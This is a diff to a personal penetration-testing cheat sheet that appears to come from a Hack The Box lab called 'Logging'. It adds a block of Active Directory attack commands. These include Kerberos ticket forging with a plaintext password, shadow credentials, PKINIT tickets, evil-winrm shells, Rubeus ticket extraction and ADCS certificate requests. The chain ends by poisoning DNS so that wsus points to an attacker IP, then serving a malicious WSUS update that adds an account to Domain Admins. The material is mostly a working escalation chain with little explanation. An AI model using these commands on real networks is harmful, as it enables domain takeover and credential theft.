@@ -28,6 +28,59 @@ getST.py -spn cifs/<host> -impersonate <user> <domain>/<account>:<password> -dc-
 
 ## Kerberoasting
 
+```bash
+netexec smb 10.129.28.224 --generate-krb5-file ~/HTB/Logging/krb5.conf
+
+export KRB5_CONFIG=/home/kali/HTB/Logging/krb5.conf
+
+faketime -f "+7h" netexec smb dc01.logging.htb -u 'svc_recovery' -p 'Em3rg3ncyPa$$2026' -k --generate-tgt /home/kali/HTB/Logging/gmsatgt.ccache
+
+export KRB5CCNAME=/home/kali/HTB/Logging/gmsatgt.ccache
+
+faketime -f "+7h" nxc smb 10.129.28.224 -u 'svc_recovery' -k --use-kcache
+
+faketime -f "+7h" bloodyAD --host dc01.logging.htb --dc-ip 10.129.29.78 -k -u 'svc_recovery' add shadowCredentials 'msa_health$'
+
+faketime -f "+7h" python3 /opt/PKINITtools/gettgtpkinit.py -cert-pem GhhGNDDY_cert.pem -key-pem GhhGNDDY_priv.pem 'logging.htb/msa_health$' GhhGNDDY.ccache
+
+export KRB5CCNAME=/home/kali/HTB/Logging/GhhGNDDY.ccache
+
+faketime -f "+7h" evil-winrm -i dc01.logging.htb -r logging.htb -K ~/HTB/Logging/GhhGNDDY.ccache
+
+// export krb of user we logged in as to use to enumerate ADCS
+
+C:\ProgramData\> .\Rubeus.exe tgtdeleg /nowrap
+
+sudo vim jaylee.b64
+
+cat jaylee.b64 | base64 -d > jaylee.kirbi
+
+impacket-ticketConverter <kribi> <ccache>.ccache && export KRB5CCNAME=/tmp/<ccache>.ccache
+
+faketime -f "+7h" certipy-ad find -u 'jaylee.clifton' -k -target dc01.logging.htb -dc-host dc01.logging.htb -dc-ip 10.129.29.78 -enabled -stdout
+
+// see Template with enrollment rights and request pfx with certipy-ad
+
+faketime -f "+7h" certipy-ad req -u 'jaylee.clifton' -k -target dc01.logging.htb -dc-host dc01.logging.htb -dc-ip 10.129.29.78 -ca 'logging-DC01-CA' -template 'UpdateSrv' -dns wsus.logging.htb
+
+// Request certificate and key with pfx
+
+faketime -f "+7h" certipy-ad cert -pfx /home/kali/HTB/Logging/wsus.pfx -nokey -out wsus.crt
+
+faketime -f "+7h" certipy-ad cert -pfx /home/kali/HTB/Logging/wsus.pfx -nocert -out wsus.key
+
+cat wsus.crt wsus.key > wsus.pem
+
+// Poison dns and use wsuks
+
+faketime -f "+7h" bloodyAD --host dc01.logging.htb --dc-ip 10.129.29.78 -d logging.htb -u 'jaylee.clifton' -k add dnsRecord 'wsus' '10.10.16.226'
+
+sudo wsuks --serve-only --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\""'
+
+faketime -f "+7h" evil-winrm -i dc01.logging.htb -r logging.htb -K ~/HTB/Logging/GhhGNDDY.ccache
+
+```
+
 ```
 # Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
 impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
